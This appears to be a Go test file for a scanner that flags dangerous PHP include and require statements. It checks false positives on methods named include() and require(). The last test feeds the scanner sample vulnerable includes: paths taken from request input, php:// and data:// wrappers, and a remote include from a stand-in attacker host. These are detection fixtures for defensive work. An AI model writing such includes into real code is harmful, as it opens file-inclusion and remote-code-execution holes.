package checks

import "testing"

// PHP 7 allows reserved words as method names, and a bootstrap method called
// include() is a common plugin idiom. The include-expression scanner accepted
// the keyword after "function " and then, because the expression walker treats
// "{" as a grouping depth rather than a block opener, swallowed the whole
// method body as the include target. Any request input anywhere in that method
// then read as an include of request input.
func TestDangerousIncludeIgnoresMethodNamedInclude(t *testing.T) {
	code := `<?php
class Plugin {
    public function __construct() {
        $this->include();
    }
    public function include() {
        require_once PLUGIN_DIR . 'inc/class-notifier.php';
        if ( ! empty( $_POST['id'] ) ) {
            $data = sanitize( $_POST['id'] );
        }
    }
}`
	if hasDangerousInclude(code) {
		t.Fatal("a method named include() whose body touches request input was reported as an include of request input")
	}
}

// The same shape with require, and via a static declaration.
func TestDangerousIncludeIgnoresFunctionNamedRequire(t *testing.T) {
	code := `<?php
function require_once_shim() {
    return true;
}
class A {
    public static function require() {
        $x = $_GET['p'];
        return $x;
    }
}`
	if hasDangerousInclude(code) {
		t.Fatal("a function/method named require() was reported as an include of request input")
	}
}

// The real construct must still be caught: an include whose target is request
// input, and one that reaches a remote or data wrapper.
func TestDangerousIncludeStillCatchesRealIncludes(t *testing.T) {
	for name, code := range map[string]string{
		"request input":  `<?php include $_GET['page'] . '.php';`,
		"require input":  `<?php require_once($_REQUEST['tpl']);`,
		"data wrapper":   `<?php include 'data://text/plain;base64,SGVsbG8=';`,
		"php input":      `<?php include("php://input");`,
		"remote wrapper": `<?php include_once 'http://evil.example/x.txt';`,
	} {
		if !hasDangerousInclude(code) {
			t.Errorf("%s: real dangerous include was not detected", name)
		}
	}
}
